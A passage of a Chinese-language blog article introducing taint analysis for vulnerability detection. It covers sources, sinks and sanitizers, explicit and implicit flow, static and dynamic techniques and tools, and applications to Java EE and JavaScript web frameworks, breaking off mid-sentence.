    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>同符号执行一样，污点分析也是我们分析代码漏洞，检测攻击方式的重要手段，在漏洞自动化扫描或者检测工具中有着十分广泛的应用，本文主要是对污点分析进行一些简单的介绍，文中内容来源于网络，在最后我会附上参考的文章以及论文的链接。</p><h2 id="0X01-污点分析基本原理"><a href="#0X01-污点分析基本原理" class="headerlink" title="0X01 污点分析基本原理"></a><strong>0X01 污点分析基本原理</strong></h2><h3 id="1-污点分析定义"><a href="#1-污点分析定义" class="headerlink" title="1.污点分析定义"></a><strong>1.污点分析定义</strong></h3><p>污点分析可以抽象成一个三元组<code>&lt;sources,sinks,sanitizers&gt;</code>的形式,其中,source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中;sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);sanitizer即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题. </p><span id="more"></span><p><strong>污点分析的处理过程可以分成 3 个阶段(如图 2 所示):</strong></p><p>(1) 识别污点源和汇聚点;<br>(2) 污点传播分析;<br>(3) 无害处理. </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF1.png" alt="此处输入图片的描述"></p><h3 id="2-识别污点源和汇聚点"><a href="#2-识别污点源和汇聚点" class="headerlink" title="2.识别污点源和汇聚点"></a><strong>2.识别污点源和汇聚点</strong></h3><p>识别污点源和污点汇聚点是污点分析的前提.目前,在不同的应用程序中识别污点源和汇聚点的方法各不<br>相同.缺乏通用方法的原因一方面来自系统模型、编程语言之间的差异.另一方面,污点分析关注的安全漏洞类<br>型不同,也会导致对污点源和污点汇聚点的收集方法迥异.表 1 所示为在 Web 应用程序漏洞检测中的污点源示<br>例[29],它们是 Web 框架中关键对象的属性. </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF2.png" alt="此处输入图片的描述"></p><p><strong>现有的识别污点源和汇聚点的方法可以大致分成 3 类:</strong></p><p>(1)使用启发式的策略进行标记,例如把来自程序外部输入的数据统称为“污点”数据,保守地认为这些数据有可能包含恶意的攻击数据(如 PHP Aspis);<br>(2)根据具体应用程序调用的 API 或者重要的数据类型,手工标记源和汇聚点(如 DroidSafe);<br>(3)使用统计或机器学习技术自动地识别和标记污点源及汇聚点.</p><h3 id="3-污点传播分析"><a href="#3-污点传播分析" class="headerlink" title="3.污点传播分析"></a><strong>3.污点传播分析</strong></h3><p>污点传播分析就是分析污点标记数据在程序中的传播途径.按照分析过程中关注的程序依赖关系的不同, 可以将污点传播分析分为显式流分析和隐式流分析.</p><h4 id="1-显示流分析"><a href="#1-显示流分析" class="headerlink" title="(1)显示流分析"></a><strong>(1)显示流分析</strong></h4><p><strong>污点传播分析中的显式流分析就是分析污点标记如何随程序中变量之间的数据依赖关系传播.</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF3.png" alt="此处输入图片的描述"></p><p>以图 3 所 示的程序为例,变量 a 和 b 被预定义的污点源函数 source 标记为污点源.假设 a 和 b 被赋予的污点标记分别为taint_a 和 taint_b.由于第 5 行的变量 x 直接数据依赖于变量 a,第 6 行的变量 y 直接数据依赖于变量 b,显式流分析会分别将污点标记 taint_a 和 taint_b 传播给第 5 行的变量 x 和第 6 行的变量 y.又由于 x 和 y 分别可以到达第 7 行和第 8 行的污点汇聚点(用预定义的污点汇聚点函数 sink 标识),图 3 所示的代码存在信息泄漏的问题.我们将在后面具体介绍目前污点传播分析中显式流分析面临的主要挑战和解决方法.</p><h4 id="2-隐式流分析"><a href="#2-隐式流分析" class="headerlink" title="(2)隐式流分析"></a><strong>(2)隐式流分析</strong></h4><p><strong>污点传播分析中的隐式流分析是分析污点标记如何随程序中变量之间的控制依赖关系传播,也就是分析污点标记如何从条件指令传播到其所控制的语句.</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF4.png" alt="此处输入图片的描述"></p><p>在图 4 所示的程序中,变量 X 是被污点标记的字符串类型变量,变量 Y 和变量 X 之间并<strong>没有直接或间接的数据依赖关系(显式流关系),但 X 上的污点标记可以经过控制依赖隐式地传播到 Y.</strong></p><p>具体来说,由第 4 行的循环条件控制的外层循环顺序地取出 X 中的每一个字符,转化成整型后赋给变量 x,再由第 7 行的循环条件控制的内层循环以累加的方式将 x 的值赋给 y,最后由外层循环将 y 逐一传给 Y.最终,第 12 行的 Y 值和 X 值相同,程序存在信息泄漏问题.但是,如果不进行隐式流污点传播分析,第 12 行 的变量 Y 将不会被赋予污点标记,程序的信息泄漏问题被掩盖.</p><p>隐式流污点传播一直以来都是一个重要的问题,和显式流一样,如果不被正确处理,会使污点分析的结果不精确.由于对隐式流污点传播处理不当导致本应被标记的变量没有被标记的问题称为欠污染(under-taint)问题.相反地,由于污点标记的数量过多而导致污点变量大量扩散的问题称为过污染(over-taint)问题.目前,针对隐式流问题的研究重点是尽量减少欠污染和过污染的情况.我们将在后面具体介绍现有技术是如何解决上述问题的. </p><h3 id="4-无害处理"><a href="#4-无害处理" class="headerlink" title="4.无害处理"></a><strong>4.无害处理</strong></h3><p>污点数据在传播的过程中可能会经过无害处理模块,无害处理模块是指污点数据经过该模块的处理后,数据本身不再携带敏感信息或者针对该数据的操作不会再对系统产生危害.换言之,带污点标记的数据在经过无害处理模块后,污点标记可以被移除.<strong>正确地使用无害处理可以降低系统中污点标记的数量,提高污点分析的效率,并且避免由于污点扩散导致的分析结果不精确的问题.</strong></p><p>在应用过程中,为了防止敏感数据被泄露(保护保密性),通常会对敏感数据进行加密处理.此时**,加密库函数应该被识别成无害处理模块**.这一方面是由于库函数中使用了大量的加密算法,导致攻击者很难有效地计算出密码的可能范围;另一方面是加密后的数据不再具有威胁性,继续传播污点标记没有意义. </p><p>此外,为了防止外界数据因为携带危险操作而对系统关键区域产生危害(保护完整性),通常会对输入的数据进行验证.此时,<strong>输入验证(input validation)模块应当被识别成无害处理模块.</strong></p><p>例如,为了防止代码注入漏洞,PHP 提供的 htmlentities 函数可以将特殊含义的 HTML 字符串转化成HTML实体(例如,将’&lt;’转化成’&lt;’).输入字符串经过上述转化后不会再携带可能产生危害的代码,可以安全地 发送给用户使用.除了语言自带的输入验证函数外,<strong>一些系统还提供了额外的输入验证工具,比如ScriptGard,CSAS,XSS Auditor,Bek.这些工具也应被识别成无害处理模块.</strong></p><p>综上,目前对污点源、污点汇聚点以及无害处理模块的识别通常根据系统或漏洞类型使用定制的方法.由于这些方法都比较直接,本文将不再进行更深入的探讨.下一节将重点介绍污点传播中的关键技术. </p><h2 id="0X02-污点传播分析的关键技术"><a href="#0X02-污点传播分析的关键技术" class="headerlink" title="0X02 污点传播分析的关键技术"></a><strong>0X02 污点传播分析的关键技术</strong></h2><p>污点传播分析是当前污点分析领域的研究重点.<strong>与程序分析技术相结合,可以获得更加高效、精确的污点分析结果.<strong>根据</strong>分析过程中是否需要运行程序,可以将污点传播分析分为静态污点分析和动态污点分析</strong>.本节主要介绍如何使用动&#x2F;静态程序分析技术来解决污点传播中的显式流分析和隐式流分析问题. </p><h3 id="1-污点传播中的显式流分析"><a href="#1-污点传播中的显式流分析" class="headerlink" title="1.污点传播中的显式流分析"></a><strong>1.污点传播中的显式流分析</strong></h3><h4 id="1-静态分析技术"><a href="#1-静态分析技术" class="headerlink" title="(1)静态分析技术"></a><strong>(1)静态分析技术</strong></h4><p><strong>静态污点传播分析(简称静态污点分析)是指在不运行且不修改代码的前提下,通过分析程序变量间的数据依赖关系来检测数据能否从污点源传播到污点汇聚点</strong>.</p><p>静态污点分析的对象一般是程序的源码或中间表示.可以将对污点传播中显式流的静态分析问题转化为对程序中静态数据依赖的分析:</p><p>(1)首先,根据程序中的函数调用关系构建调用图(call graph,简称CG);<br>(2)然后,在函数内或者函数间根据不同的程序特性进行具体的数据流传播分析.常见的显式流污点传播方式包括直接赋值传播、通过函数(过程)调用传播以及通过别名(指针)传播.</p><p><strong>以图 5 所示的 Java 程序为例:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF5.png" alt="此处输入图片的描述"></p><p>第 3 行的变量 b 为初始的污点标记变量,程序第 4 行将一个包含变量 b 的算术表达式的计算结果直接赋给变量 c.由于变量 c 和变量 b 之间具有直接的赋值关系,污点标记可直接从赋值语句右部的变量传播到左部,也就是上述 3种显式流污点传播方式中的<strong>直接赋值传播</strong>.</p><p>接下来,变量 c 被作为实参传递给程序第 5 行的函数 foo,c 上的污点标记也通过函数调用传播到 foo 的形参 z,z 的污点标记又通过直接赋值传播到程序第 8 行的 x.f.由于 foo 的另外两个参数对象 x 和 y 都是对对象 a 的引用,二者之间存在别名,因此,x.f的污点标记可以通过别名传播到第 9 行的污点汇聚点,程序存在泄漏问题. </p><p>目前,<strong>利用数据流分析解决显式污点传播分析中的直接赋值传播和函数调用传播已经相当成熟</strong>,研究的重点是如何为别名传播的分析提供更精确、高效的解决方案.由于精确度越高(上下文敏感、流敏感、域敏感、对象敏感等)的程序静态分析技术往往伴随着越大的时空开销,追求全敏感且高效的别名分析难度较大.又由于静态污点传播分析关注的是从污点源到污点汇聚点之间的数据流关系,分析对象并非完整的程序,而是确定的入口和出口之间的程序片段.这就意味着可<strong>以尝试采用按需(on-demand)定制的别名分析方法来解决显式流态污点分析中的别名传播问题</strong>.有些使用按需的上下文敏感的别名分析的污点分析方法来检测 Java 应用程序漏洞.TAJ工具使用了混合切片结合对象敏感的别名分析来进行 Java Web 应用上的污点分析.Andromeda工具使用了按需的对象敏感别名分析技术解决对象的访问路径(access path)问题,FlowDroid工具提出一种按需的别名分析,从而提供上下文敏感、流敏感、域敏感、对象敏感的污点分析,用以解决 Android的隐私泄露问题.</p><h4 id="2-动态分析技术"><a href="#2-动态分析技术" class="headerlink" title="(2)动态分析技术"></a><strong>(2)动态分析技术</strong></h4><p>动态污点传播分析(简称动态污点分析)<strong>是指在程序运行过程中,通过实时监控程序的污点数据在系统程序中的传播来检测数据能否从污点源传播到污点汇聚点</strong>.动态污点传播分析首先需要为污点数据扩展一个污点标记(tainted tag)的标签并将其存储在存储单元(内存、寄存器、缓存等)中,然后根据指令类型和指令操作数设计相应的传播逻辑传播污点标记.</p><p><strong>动态污点传播分析按照实现层次被分为基于硬件、基于软件以及混合型的污点传播分析这3类.</strong></p><h5 id="1-硬件"><a href="#1-硬件" class="headerlink" title="1.硬件"></a><strong>1.硬件</strong></h5><p><strong>基于硬件的污点传播分析需要定制的硬件支持</strong>,一般需要在原有体系结构上为寄存器或者内存扩展一个标记位,用来存储污点标记,代表的系统有 Minos,Raksha等.</p><h5 id="2-基于软件"><a href="#2-基于软件" class="headerlink" title="2.基于软件"></a><strong>2.基于软件</strong></h5><p><strong>基于软件的污点传播分析通过修改程序的二进制代码来进行污点标记位的存储与传播</strong>,代表的系统有 TaintEraser[64],TaintDroid[19]等.</p><p>基于软件的污点传播的<strong>优点在于不必更改处理器等底层的硬件,并且可以支持更高的语义逻辑的安全策略</strong>(利用其更贴近源程序层次的特点),但缺点是使用插桩(instrumentation <strong>在保证被测程序原有逻辑完整性的基础上在程序中插入一些探针</strong>)或代码重写(code rewriting)修改程序往往会给分析系统带来巨大的开销.相反地,基于硬件的污点传播分析虽然可以利用定制硬件降低开销,但通常不能支持更高的语义逻辑的安全策略,并且需要对处理器结构进行重新设计.</p><h5 id="3-混合型"><a href="#3-混合型" class="headerlink" title="3.混合型"></a><strong>3.混合型</strong></h5><p>混合型的污点分析是对上述两类方法的折中,即,<strong>通过尽可能少的硬件结构改动以保证更高的语义逻辑的安全策略</strong>,代表的系统有 Flexitaint,PIFT等.</p><p>目前,针对动态污点传播分析的研究工作关注的<strong>首要问题是如何设计有效的污点传播逻辑,以确保精确的污点传播分析.</strong></p><p>TaintCheck利用插桩工具 Valgrind对其中间表示 Ucode 插桩并提供移动指令、算术指令以及除移动和算术外其他指令的 3 类传播逻辑实现对 x86 程序的动态污点分析.Privacy Scope,Dytan和Libdft以插桩工具 Pin为基础,实现针对 x86 程序的动态污点分析,并解决了一系列 x86 指令污点传播逻辑的问题.TaintDroid提供了一套基于 Android Dalvik 虚拟机的 DEX 格式的污点传播分析方法.由于 DEX的指令包含多数常用的指令和具有面向对象特性的指令,普适性高,这里以TaintDroid中污点传播方法为示例,介绍动态污点传播的逻辑. </p><p>DEX 支持的变量类型有 5 种:本地变量、方法参数、类静态域、类实例域和数组.TaintDroid 用υX 代表本地变量和方法参数,fX 代表类的静态域,υY(fX)代表实例域,其中,υY是具体实例的变量引用.υX[⋅]代表数组,其中,υX表示数组的对象引用.</p><p>同时,TaintDroid 使用虚拟污点映射函数τ(⋅)来辅助污点传播,对于变量υ,τ(υ)返回变量的污点标记 t.τ(υ)可以被赋值给其他的变量.符号←代表将位于符号右部的变量的污点标记传播给左部的变量.具体的污点传播逻辑规则见表 2.</p><ul><li>对常数、移动(赋值)、一元算术逻辑指令的传播逻辑是直接将指令的右值的污点标记传递给指令的<br>左值;</li><li>对于多元算术逻辑指令,需要将指令的右值的污点标记进行合并之后传播给指令的左值;</li><li>对于返回指令和异常处理指令,分别将变量标记传递给与返回、异常处理相关的变量;</li><li>对于数组指令,除了对数组变量的标记进行传播外,还需要将数组索引变量的标记合并传播.例如,对于<br>数组赋值 b&#x3D;Z[a],索引变量 a 的污点标记也需要传播给 b 变量;</li><li>对于域操作相关指令,同样需要将对象的域变量污点标记以及域所属对象变量的标记进行合并传播.</li></ul><p><strong>动态污点传播分析的另一个研究重点是如何降低分析代价</strong>.如前所述,传统的基于硬件的动态污点传播分析技术需要定制硬件的支持,而基于软件的技术由于程序插桩或代码重写会带来额外的性能开销.为控制分析代价,一类研究工作采用的<strong>思路是有选择地对系统中的指令进行污点传播分析</strong>.例如,LIFT提出的快速路径(fast-path)优化技术通过提前判断一个模块的输入和输出是否是具有威胁的(如果没有威胁,则无需进行污点传播)以降低需要重写的代码的数量;合并检查(merged check)优化技术将多个基本块合并成 1个进行检查,以降低检查次数;</p><p>快速切换(fast switch)优化则利用活性分析消除一些之后不活跃的条件寄存器的 save 和 restore 操作,以减少需要分析的指令数量.PIFT系统提出了基于预测的污点跟踪(传播)方式,他们设计统计实验观察到CPU 指令流中 load 和 store 指令存在一些特殊性质(load 指令与其子序列中 store 指令距离接近、load 指令之后的 store 指令个数不多、连续的 load 指令之间的距离是均匀的).基于此,提出了基于预测的只跟踪 load 和 store指令的策略,即:**如果load指令的操作数是污点数据,那么将其一定距离内的store指令的目的地址标记成污点数据.**该方法减少了跟踪其他复杂CPU指令的开销.</p><p>**另外一类降低分析代价的思路是,使用低开销的机制代替高开销机制.**例如,SHIFT将动态污点分析转化成延迟例外(deferred exceptions)处理的问题.延迟例外是指在例外发生后,将例外标记在相关的指令中,之后再通过检测指令检测出被标记指令中的例外并处理例外,这种机制与污点标记传播的机制类似.SHIFT将污点传播分析实现在支持投机执行(speculative execution)的处理器中,既不需要改变计算机处理器本身,又可以充分利用该处理器高速处理延迟例外的优势,从而达到降低动态污点分析开销的效果.又比如,LIFT 的快速切换(fast switch)优化使用低开销的 lahf&#x2F;sahf 指令代替高开销的 pushq&#x2F;popq 指令,以提高插桩代码与原始二进制文件之间的切换效率. </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF6.png" alt="此处输入图片的描述"></p><h3 id="2-污点传播中的隐式流分析"><a href="#2-污点传播中的隐式流分析" class="headerlink" title="2.污点传播中的隐式流分析"></a><strong>2.污点传播中的隐式流分析</strong></h3><p>污点传播分析中的隐式流分析就是<strong>分析污点数据如何通过控制依赖进行传播</strong>,如果忽略了对隐式流污点传播的分析,则会导致欠污染的情况;如果对隐式流分析不当,那么除了欠污染之外,还可能出现过污染的情况.与显式流分析类似,<strong>隐式流分析技术同样也可以分为静态分析和动态分析两类.</strong></p><h4 id="1-静态分析技术-1"><a href="#1-静态分析技术-1" class="headerlink" title="(1)静态分析技术"></a><strong>(1)静态分析技术</strong></h4><p>**静态隐式流分析面临的核心问题是精度与效率不可兼得的问题.<strong>精确的隐式流污点传播分析需要分析每一个分支控制条件是否需要传播污点标记.<strong>路径敏感的数据流分析往往会产生路径爆炸问题</strong>,导致开销难以接受.为了降低开销,一种简单的静态传播(标记)分支语句的污点标记方法</strong>是将控制依赖于它的语句全部进行污点标记,**但该方法会导致一些并不携带隐私数据的变量被标记,导致过污染情况的发生.过污染会引起污点的大量扩散,最终导致用户得到的报告中信息过多,难以使用.</p><h4 id="2-动态分析技术-1"><a href="#2-动态分析技术-1" class="headerlink" title="(2)动态分析技术"></a><strong>(2)动态分析技术</strong></h4><p><strong>动态隐式流分析关注的首要问题是如何确定污点控制条件下需要标记的语句的范围</strong>.由于动态执行轨迹并不能反映出被执行的指令之间的控制依赖关系,<strong>目前的研究多采用离线的静态分析辅助判断动态污点传播中的隐式流标记范围</strong>.Clause等人提出,利用离线静态分析得到的控制流图节点间的后支配(post-dominate)关系来解决动态污点传播中的隐式流标记问题.</p><p><strong>例如,如图 6(a)所示</strong>,程序第 3 行的分支语句被标记为污点源,当document.cookie 的值为 abc 时,会发生污点数据泄露.根据基于后支配关系的标记算法,会对该示例第 4 行语句的指令目的地,即 x 的值进行污点标记. </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF7.png" alt="此处输入图片的描述"></p><p><strong>动态分析面临的第 2 个问题是由于部分泄漏(partially leaked)导致的漏报.<strong>部分泄漏是指污点信息通过</strong>动态未执行部分进行传播并泄漏</strong>.Vogt等人发现,只动态地标记分支条件下的语句会发生这种情况.</p><p>**仍以图 6(a)中的程序为例:**当第 3 行的控制条件被执行时,对应的 x 会被标记.此时,x 的值为 true,而 y 值没有变化,仍然为 false.在后续执行过程中,由于第 9行的污点汇聚点不可达,而第 12 行的汇聚点可达,动态分析没有检测到污点数据泄漏.但攻击者由第 11 行 y 等于 false 的条件能够反推出程序执行了第 3 行的分支条件,程序实际上存在信息泄漏的问题.这个信息泄露是由第 6 行未被执行到的 y 的赋值语句所触发的.因此,y 应该被动态污点传播分析所标记.为了解决部分泄漏问题,Vogt等人在传统的动态污点分析基础上增加了离线的静态分析,以跟踪动态执行过程中的控制依赖关系,<strong>对污点分支控制范围内的所有赋值语句中的变量都进行标记</strong>.具体到图 6(a)所示的例子,就是第 4 行和第 6 行中的变量均会被污点标记.但是,Vogt 等人的方法仍然会产生过污染的情况. </p><p>**动态分析需要解决的第 3 个问题是如何选择合适的污点标记分支进行污点传播.**鉴于单纯地将所有包含污点标记的分支进行传播会导致过污染的情况,可以根据信息泄漏范围的不同,定量地设计污点标记分支的选择策略.</p><p><strong>以图 6(b)所示的程序为例,<strong>第 2 行的变量 a 为初始的污点标记变量.第 5 行、第 7 行、第 9 行均为以 a作为源操作数的污点标记的分支.如果传播策略为只要分支指令中包含污点标记就对其进行传播,那么第 5 行、第 7 行、第 9 行将分别被传播给第 6 行、第 8 行、第 10 行,并最终传播到第 12 行的污点汇聚点.如果对这段程序进行深入分析会发现,3个分支条件所提供的信息值(所能泄露的信息范围)并不相同,分别是 a 等于 10、a大于 10 且小于或等于 13(将 w 值代入计算)以及 a 小于 10.对于 a 等于 10 的情况,攻击者可以根据第 12 行泄漏的 x 的值直接还原出污点源处 a 的值</strong>(这类分支也被称为能够保存完整信息的分支)</strong>;对于 a 大于 10 且小于或等于 13 的情况,攻击者也只需要尝试 3 次就可以还原信息;而对于 a 小于 10 的情况,攻击者所获得的不确定性较大,成功还原信息的几率显著低于前两种,对该分支进行污点传播的实际意义不大.</p><p>Bao等人<strong>只将严格控制依赖(strict control dependence)识别成需要污点传播的分支</strong>,其中,**严格控制依赖即分支条件表达式的两端具有常 数差异的分支.**但是,Bao 的方法只适用于能够在编译阶段计算出常数差异的分支.</p><p>Kang 等人提出的 DTA++ 工具使用基于离线执行踪迹(trace)的符号执行的方法来寻找进行污点传播的分支,但该方法只关注信息被完整保存的分支,即图 6(b)中第 5 行的 a&#x3D;&#x3D;10 会被选择污点传播,但是信息仍然能够通过另一个范围(第 7 行的分支)而泄露.</p><p>Cox 等人提出的 SpanDex 的主要思想是:动态地获得控制分支中污点数据的范围,根据数据的更改以及数据间的依赖关系构建一个基于操作的有向无环图(OP-DAG),再结合一个在线的约束求解器(CSP solver)确定隐式流中传播的隐私数据值的范围,通过预先设定的阈值,选择是否对数据进行污点传播.该方法对图 6(b)所示例子中的第 5 行、第 7行的分支进行污点传播.但是目前,该方法只能求解密码字符的范围,暂不支持对复杂操作(位、除法、数组等操作)的求解.</p><h2 id="0X03-污点分析在实际应用中的关键技术"><a href="#0X03-污点分析在实际应用中的关键技术" class="headerlink" title="0X03 污点分析在实际应用中的关键技术"></a><strong>0X03 污点分析在实际应用中的关键技术</strong></h2><p>污点分析被广泛地应用在系统隐私数据泄露、安全漏洞等问题的检测中.在实际应用过程中,由于系统框架、语言特性等方面的差异,通用的污点分析技术往往难以适用.比如:系统框架的高度模块化以及各模块之间复杂的调用关系导致污点源到汇聚点的传播路径变得复杂、庞大,采用通用的污点分析技术可能面临开销难以接受的问题;通用的污点分析技术对新的语言特性支持有限等.为此,需要针对不同的应用场景,对通用的污点分析技术进行扩展或定制.</p><p>本节以 Web 应用安全漏洞检测为切入点,总结污点分析技术在上述领域的应用实践过程中所面临的问题和关键解决技术. </p><p>目前,**Web 应用程序中存在大量的安全漏洞,如跨站脚本攻击、SQL 注入等.污点分析可以有效地检测这些安全漏洞.**基于 HTTP 协议的 Web 应用框架在总体上分成两大部分:服务器端应用程序和客户端应用程序.用户浏览 Web 网页时,浏览器通过 HTTP 协议与 Web 服务器交换信息.浏览器端上的应用程序被称为客户端应用程序.客户端应用程序使用 HTML 结合脚本语言(比如 JavaScript)处理和交换数据,再将数据显示在网页上.Web服务器端应用程序接收客户端脚本语言的请求(request),根据请求执行对应的逻辑计算或者数据库查询操作,然后返回一个响应(response)给客户端.如此往复地进行信息交换,完成网页浏览.</p><p>Web 应用程序中的安全漏洞可能发生在客户端的脚本程序中,也可能发生在服务器端的应用程序中,还可能是由服务器端和客户端程序合作触发的.无论是客户端的应用程序还是服务器端的应用程序,一旦安全漏洞被攻击者利用,都可能会给用户带来财产损失.目前的 Web 框架有数百种之多,本节选取一个服务器端 Web应用框架(Java EE)和一个客户端 Web 框架(JavaScript)为代表进行论述. </p><h3 id="1-Java-Web-框架上的污点分析技术"><a href="#1-Java-Web-框架上的污点分析技术" class="headerlink" title="1.Java Web 框架上的污点分析技术"></a><strong>1.Java Web 框架上的污点分析技术</strong></h3><p>Java EE(Java platform,enterprise edition)框架是一种典型的服务器端 Web 应用程序框架,目前被广泛应用于企业级 Web 的构建.Servlets 和 Java Server Pages(JSP)是 Java EE 中两个最重要的部分.Servlet 类主要提供逻辑处理功能:通过处理接口与配置文件交互来处理客户端请求;JSP 通过在传统的 HTML 页面中插入 Java 程序段和 JSP 标记的方式提供页面显示.</p><p>在 Java EE 的基础上又扩展了很多其他框架,这些框架可以提供更高级别的 Web 开发抽象,比如基于 MVC<br>模型的 Struts 框架.Struts使用控制器(controller)处理主要业务逻辑,使用视图(view)渲染响应页面,使用模型(model)来存储数据模型.如图 10 所示是 Struts 处理 HTTP 请求的流程:当控制器 ActionServlet 收到一个 HTTP请求时,它会解析得到其 URL 并根据配置文件决定处理该请求的 Action 子类.同时,添加一个 ActionForm 对象用以存储请求的数据.Struts 会自动完成对 ActionForm 对象的填充并启动 Action 子类的对象,再通过 execute 方法读入 ActionForm 对象,以进一步处理相关业务逻辑.处理后的 Action 子类会返回一个 ActionForward 类,Struts会根据配置文件得出下一个跳转页面并转发给 JSP,由 JSP 将其渲染后发送到客户端进行显示.</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF8.png" alt="此处输入图片的描述"></p><p>如图 10 中虚线箭头所示为 Java EE 上的污点传播的分析过程:<strong>一般而言,Java EE 框架的污点来源于客户端的浏览器输入</strong>,但是 Java EE 框架不能直接分析浏览器中的客户端代码.考虑到浏览器中的内容直接来源于 JSP,污点分析首先需要获得 JSP 上相关的污点源信息;其次,<strong>Web页面间的跳转关系决定了污点的传播逻辑</strong>,其中,ActionServlet 通过 Java 的反射机制与配置文件交互决定由哪个 Action 类处理对应的页面跳转;最后,污点的汇聚点存在于具体的 Action 类的重要数据区域.上述分析过程表明:<strong>针对 Java EE 框架的污点传播分析仅仅实现在 Java 层是不够的,需要考虑到 Java 代码、配置文件、JSP 代码三者之间的交互处理问题.</strong> </p><p><strong>为了将这三者的代码集中分析,Møller 等人将它们对应到 Java 代码中,提出了基于跟踪 Web程序状态的污点分析方法.</strong></p><p>该方法包括 3 个步骤:<strong>识别客户端状态、识别共享程序状态和污点传播分析,</strong></p><p>其中,识别客户端状态就是识别 JSP中能够直接引用服务器端的内部对象(比如数据库记录)的参数.具体方法是,首先分析配置文件中页面跳转关系信息,形成一张能够反映页面之间访问关系的图.图中的节点代表页面,边代表页面之间可能的跳转关系以及跳转过程中触发的 Action 和 From.对于一个 JSP 页面 p,识别引用参数的方法是将图中指向页面p 的边上的Action 类的参数和页面 p 中的文档参数(一般是隐藏字段、选择框、链接等)进行匹配,将能够被匹配的参数识别为客户端状态,也就是污点源.识别共享应用程序状态就是识别 Java 代码中重要的数据区域接口,也就是污点汇聚点.</p><p><strong>共享应用程序状态包括两个部分:</strong></p><p>(a) 内部应用程序状态,包括 HTTPServlet 对象、ServletContext 对象以及所有的静态域;<br>(b) 外部应用程序状态,即,存储在文件和数据库中的状态代码.污点传播</p><p>分析以识别出的客户端状态为污点源,以共享应用程序状态为污点汇聚点,判断客户端程序状态值是否会被写<br>入到内部程序状态对象或者能否调用外部程序状态.</p><p>Sridharan 等人提出的 F4F 使用了一种语言规范格式来解决不同语言代码间的交互问题.主要思想是:使用 Web 应用框架语言(Web application framework language,简称 WAFL)统一整个 Java EE 框架上的不同过程的代码,最后在 WAFL 的基础上进行污点分析.如图 11 所示是 WAFL 的文法规范,包括 3个部分:全局变量(global)、合成方法(synthetic methods)和调用替换(call replacement). </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF9.png" alt="此处输入图片的描述"></p><p>全局变量用来表示那些在不同模块之间传递的变量;合成方法对框架中不同模块的代码以及配置文件进行合成,将不同的代码放在一个方法中进行分析;调用替换表示一个调用点需要替换成一个具体的代码进行分析.F4F 还提供了一种有效的文法生成方法,生成的文法将作为污点分析的输入代码. </p><h3 id="2-解决-JavaScript-上的污点分析"><a href="#2-解决-JavaScript-上的污点分析" class="headerlink" title="2.解决 JavaScript 上的污点分析"></a><strong>2.解决 JavaScript 上的污点分析</strong></h3><p>Web 脚本直接运行在客户端浏览器中,具有简单易学、开发速度快、可移植性强、便于集成成熟技术等优势.目前最流行的 Web 脚本语言是 JavaScript,它是一个灵活的动态脚本语言,提供面向对象特性、DOM 模型调用、与网络库动态交互信息等特性,可以提供更高的用户体验.例如:在使用 Gmail时,需要对用户名和密码进行验证,这个验证过程是静态 HTML 无法完成的,但可以利用 JavaScript 实现.</p><p>脚本语言同样面临严重的安全性问题.在使用 JavaScript 的过程中,重要数据(如定位信息、RSS 等)可能会通过第三方应用脚本进行处理.恶意的第三方应用可能导致恶意的软件行为,比如窃取用户的隐私数据、破坏用户的重要数据或者将页面重定位到具有恶意行为的页面等.污点分析技术可以被用于检测上述问题,但是由于 JavaScript 语言中包含的大量有别于传统的 C&#x2F;C++&#x2F;Java语言的新特性,需要对传统污点分析技术进行扩展.</p><p>JavaScript 上的污点分析首先需要解决 JavaScript 的特殊语法特性带来的问题,**目前的方法多使用代码重写的方式解决该问题.**有人提出了解决 JavaScript中函数、域、原型(prototypes)等特性带来的污点传播问题;ACTARUS在抽象语法树级别进行代码重写,主要解决由于原型系统、对象创建(object creations)、反射属性访问(reflective property accesses)、词法作用域(lexical scoping)等语言特性导致的难以建立完整的调用图的问题.</p><p>JavaScript 语言大量地使用动态特性来提高用户的体验,例如在运行时动态地加载第三方库、使用 eval 